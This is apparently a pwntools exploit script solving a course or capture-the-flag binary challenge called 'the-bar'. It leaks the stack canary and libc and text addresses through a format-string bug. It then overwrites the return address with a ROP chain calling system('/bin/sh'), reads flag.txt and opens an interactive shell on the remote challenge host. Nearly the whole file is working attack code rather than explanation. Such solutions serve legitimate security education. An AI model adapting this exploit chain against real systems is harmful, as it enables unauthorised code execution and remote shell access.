from pwn import *

port = 23231
bpath = './the-bar'
context.binary = bpath
context.log_level = 'info'

gdbscript = '''
            break *main+0x40
            shell tmux swap-pane -U
            shell tmux select-layout main-vertical
            continue
            '''

def leak(param_num):
    #p = remote('cs4401shell2.walls.ninja', port)
    p = process(bpath)

    p.sendline(f"%{param_num}$p".encode())
    p.recvuntil(b'Please enter unlock code:\n') 
    leak_raw = p.recvline().strip()
    leak_value = int(leak_raw, 16)
    p.sendline(b"a")
    p.close()
    return leak_value

#for param_num in range(1, 16):
#    try:
#        # we use context.silent to disable the pwntools output temporarily
#        with context.silent:
#            leak_value = leak(param_num)
#        log.info(f"Address leaked at param {param_num}: {hex(leak_value)}")
#    except Exception as e:
#        log.info(f"Leak failed at param {param_num}: {e}")


## EXPLOIT ##
#p = gdb.debug(bpath, gdbscript=gdbscript)
p = remote('cs4401shell2.walls.ninja', port)
#p = process(bpath)

# buffer in unlock() is 24 bytes
# offset to return address of unlock() is 44 bytes
# canary is likely at 8 bytes before this, in param
p.sendline(b"%9$p %15$p %11$p")
p.recvuntil(b'Please enter unlock code:\n')
leak = p.recvline().strip().split()
canary = int(leak[0], 16)
libc_addr = int(leak[1], 16)
text_addr = int(leak[2], 16)
print('canary: ', hex(canary))
print('leaked libc addr: ', hex(libc_addr))     # <__libc_start_main+231>
print('leaked text addr: ', hex(text_addr))

libc_start_main = libc_addr - 231
text_base = text_addr - 0x8fa
libc_base = libc_start_main - 0x21ba0


addr_system = libc_base + 0x4f420
addr_binsh = libc_base + 0x1b3d88

#addr_system = libc_base + 0x4f420  
#addr_binsh = libc_base + 0x1b3d88

print('text base: '   , hex(text_base))
print('libc base: '   , hex(libc_base))
print('addr system: ' , hex(addr_system))
print('addr /bin/sh: ', hex(addr_binsh))

offset_ret_unlock = 40
offset_canary_unlock = 24

'''
Chain:
    1. 0x00000000000006be : ret
    2. 0x0000000000000983 : pop rdi ; ret
    3. &"/bin/sh"
    4. &system
'''
rop_chain = flat(p64(text_base + 0x6be), p64(text_base + 0x983), p64(addr_binsh), p64(addr_system))
#one_gadget = libc_base + 0xda937
#print('addr one gadget: ', hex(one_gadget))

exploit_str = flat({offset_canary_unlock: canary, offset_ret_unlock: rop_chain})
p.sendline(exploit_str)

try:
    p.sendline(b'cat flag.txt && /bin/sh')
except:
    print('didnt work')

p.interactive()



